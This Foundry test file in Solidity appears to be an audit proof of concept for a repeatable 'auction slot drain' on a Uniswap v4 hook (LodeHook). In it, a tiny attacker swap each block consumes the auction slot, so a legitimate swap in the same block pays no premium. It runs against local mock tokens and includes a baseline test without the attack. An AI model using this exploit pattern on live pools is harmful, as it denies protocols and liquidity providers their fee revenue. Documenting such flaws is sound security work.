// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {SwapParams, ModifyLiquidityParams} from "v4-core/src/types/PoolOperation.sol";
import {Currency, CurrencyLibrary} from "v4-core/src/types/Currency.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {IUnlockCallback} from "v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {LodeHook} from "../src/LodeHook.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";

contract AuctionSlotDrainTest is Test, IUnlockCallback {
    using PoolIdLibrary for PoolKey;
    using CurrencyLibrary for Currency;

    PoolManager poolManager;
    LodeHook hook;

    MockERC20 tokenA;
    MockERC20 tokenB;
    Currency currency0;
    Currency currency1;

    address owner    = makeAddr("owner");
    address guardian = makeAddr("guardian");
    address splitter = makeAddr("splitter");
    address operator = makeAddr("operator");
    address attacker = makeAddr("attacker");
    address legit    = makeAddr("legit");

    PoolKey key;
    PoolId  id;

    uint24  constant PREMIUM_BPS       = 100;
    uint128 constant MIN_AUCTION_INPUT = 1e6;
    uint256 constant LEGIT_SWAP        = 100e18;
    uint160 constant SQRT_PRICE_1_1    = 79228162514264337593543950336;

    // Tracks which user's tokens to pull during settlement
    address private _currentSwapper;

    function setUp() public {
    tokenA = new MockERC20("Token A", "TKNA", 18);
    tokenB = new MockERC20("Token B", "TKNB", 18);
    if (address(tokenA) > address(tokenB)) {
        (tokenA, tokenB) = (tokenB, tokenA);
    }
    currency0 = Currency.wrap(address(tokenA));
    currency1 = Currency.wrap(address(tokenB));

    poolManager = new PoolManager(address(this));

    bytes memory creationCode = abi.encodePacked(
        type(LodeHook).creationCode,
        abi.encode(address(poolManager), owner, guardian)
    );
    bytes32 salt = _mineHookSalt(creationCode, uint160(0x0088));
    address hookAddr;
    assembly {
        hookAddr := create2(0, add(creationCode, 0x20), mload(creationCode), salt)
    }
    hook = LodeHook(hookAddr);

    key = PoolKey({
        currency0:   currency0,
        currency1:   currency1,
        fee:         3000,
        tickSpacing: 60,
        hooks:       IHooks(address(hook))
    });
    id = key.toId();

    vm.prank(owner);
    hook.configurePool(key, PREMIUM_BPS, splitter, operator, MIN_AUCTION_INPUT);

    poolManager.initialize(key, SQRT_PRICE_1_1);

    // Test contract holds all tokens and settles on behalf of all actors
    tokenA.mint(address(this), 200_000e18);
    tokenB.mint(address(this), 200_000e18);
    tokenA.approve(address(poolManager), type(uint256).max);
    tokenB.approve(address(poolManager), type(uint256).max);
    _unlock("addLiquidity");
}

    // -------------------------------------------------------------------------
    // Tests
    // -------------------------------------------------------------------------

    function test_slotDrain_attack() public {
    // ── Block 100 ────────────────────────────────────────────────────────
    vm.roll(100);

    uint256 splitterBefore = tokenA.balanceOf(splitter);

    // Attacker executes minimal swap to consume auction slot
    _currentSwapper = attacker;
    _unlock("attackSwap");

    uint256 splitterAfterAttack = tokenA.balanceOf(splitter);

    console.log("=== Block 100: Attacker burns auction slot ===");
    console.log(
        "Premium paid by attacker:",
        splitterAfterAttack - splitterBefore
    );

    // Legitimate $10k swap in same block
    _currentSwapper = legit;
    _unlock("legitSwap");

    uint256 splitterAfterLegit = tokenA.balanceOf(splitter);

    uint256 premiumFromLegit =
        splitterAfterLegit - splitterAfterAttack;

    uint256 expectedPremium =
        (LEGIT_SWAP * PREMIUM_BPS) / 10_000;

    console.log("=== Same block: Legitimate $10k swap ===");
    console.log("Expected premium:", expectedPremium);
    console.log("Premium from legit swap:", premiumFromLegit);
    console.log("Revenue lost:", expectedPremium - premiumFromLegit);

    assertEq(
        premiumFromLegit,
        0,
        "Legitimate swap paid no premium after slot drain"
    );

    // ── Block 101: confirm attack is repeatable every block ───────────────
    vm.roll(101);

    uint256 splitterBeforeBlock2 = tokenA.balanceOf(splitter);

    _currentSwapper = attacker;
    _unlock("attackSwap");

    uint256 splitterAfterAttackBlock2 = tokenA.balanceOf(splitter);

    _currentSwapper = legit;
    _unlock("legitSwap");

    uint256 splitterAfterLegitBlock2 = tokenA.balanceOf(splitter);

    uint256 premiumFromLegitBlock2 =
        splitterAfterLegitBlock2 - splitterAfterAttackBlock2;

    console.log("=== Block 101: Attack repeated ===");
    console.log(
        "Premium from legitimate swap:",
        premiumFromLegitBlock2
    );

    assertEq(
        premiumFromLegitBlock2,
        0,
        "Attack repeatable every block"
    );

    console.log("=== Economics ===");
    console.log(
        "Attacker premium block 100:",
        splitterAfterAttack - splitterBefore
    );
    console.log(
        "Attacker premium block 101:",
        splitterAfterAttackBlock2 - splitterBeforeBlock2
    );
    console.log(
        "Expected premium denied per block:",
        expectedPremium
    );
}

    function test_slotDrain_baseline() public {
        // Confirm that WITHOUT the attack, premium IS captured correctly
        vm.roll(200);

        uint256 splitterBefore = tokenA.balanceOf(splitter);

        _currentSwapper = legit;
        _unlock("legitSwap");

        uint256 captured = tokenA.balanceOf(splitter) - splitterBefore;
        uint256 expected = (LEGIT_SWAP * PREMIUM_BPS) / 10_000;

        console.log("=== Baseline (no attack) ===");
        console.log("Expected premium:", expected);
        console.log("Captured premium:", captured);

        assertApproxEqAbs(captured, expected, 1e12, "Baseline premium should be captured correctly");
    }

    // -------------------------------------------------------------------------
    // IUnlockCallback
    // -------------------------------------------------------------------------
    function unlockCallback(bytes calldata data) external override returns (bytes memory) {
        string memory action = abi.decode(data, (string));
        if (keccak256(bytes(action)) == keccak256("addLiquidity")) {
            _addLiquidity();
        } else if (keccak256(bytes(action)) == keccak256("attackSwap")) {
            _attackSwap();
        } else if (keccak256(bytes(action)) == keccak256("legitSwap")) {
            _legitSwap();
        }
        return "";
    }

    function _unlock(string memory action) internal {
        poolManager.unlock(abi.encode(action));
    }

    // -------------------------------------------------------------------------
    // Pool actions
    // -------------------------------------------------------------------------
    function _addLiquidity() internal {
        (BalanceDelta delta,) = poolManager.modifyLiquidity(
            key,
            ModifyLiquidityParams({
                tickLower:      -600,
                tickUpper:       600,
                liquidityDelta:  30_000e18,
                salt:            bytes32(0)
            }),
            ""
        );

        int128 d0 = delta.amount0();
        int128 d1 = delta.amount1();

        if (d0 < 0) {
            poolManager.sync(currency0);
            tokenA.transfer(address(poolManager), uint128(-d0));
            poolManager.settle();
        }
        if (d1 < 0) {
            poolManager.sync(currency1);
            tokenB.transfer(address(poolManager), uint128(-d1));
            poolManager.settle();
        }
    }

    function _attackSwap() internal {
    BalanceDelta delta = poolManager.swap(
        key,
        SwapParams({
            zeroForOne:        true,
            amountSpecified:   int256(uint256(MIN_AUCTION_INPUT)),
            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
        }),
        ""
    );
    _settle(delta, attacker);
}

    function _legitSwap() internal {
    BalanceDelta delta = poolManager.swap(
        key,
        SwapParams({
            zeroForOne:        true,
            amountSpecified:   -int256(LEGIT_SWAP),
            sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(-100)
        }),
        ""
    );
    _settle(delta, legit);
}

    function _settle(BalanceDelta delta, address user) internal {
    int128 d0 = delta.amount0();
    int128 d1 = delta.amount1();

    if (d0 < 0) {
        poolManager.sync(currency0);
        tokenA.transfer(address(poolManager), uint128(-d0));
        poolManager.settle();
    }
    if (d1 < 0) {
        poolManager.sync(currency1);
        tokenB.transfer(address(poolManager), uint128(-d1));
        poolManager.settle();
    }
    if (d0 > 0) poolManager.take(currency0, user, uint128(d0));
    if (d1 > 0) poolManager.take(currency1, user, uint128(d1));
}

    // -------------------------------------------------------------------------
    // Hook salt miner
    // -------------------------------------------------------------------------
    function _mineHookSalt(bytes memory creationCode, uint160 flags)
        internal
        view
        returns (bytes32 salt)
    {
        bytes32 initHash = keccak256(creationCode);
        for (uint256 i = 0; i < 500_000; i++) {
            salt = bytes32(i);
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                initHash
            )))));
            uint160 addr = uint160(predicted);
            if ((addr & flags) == flags && (addr & 0x3FFF & ~flags) == 0) {
                return salt;
            }
        }
        revert("No valid salt found - increase search range");
    }
}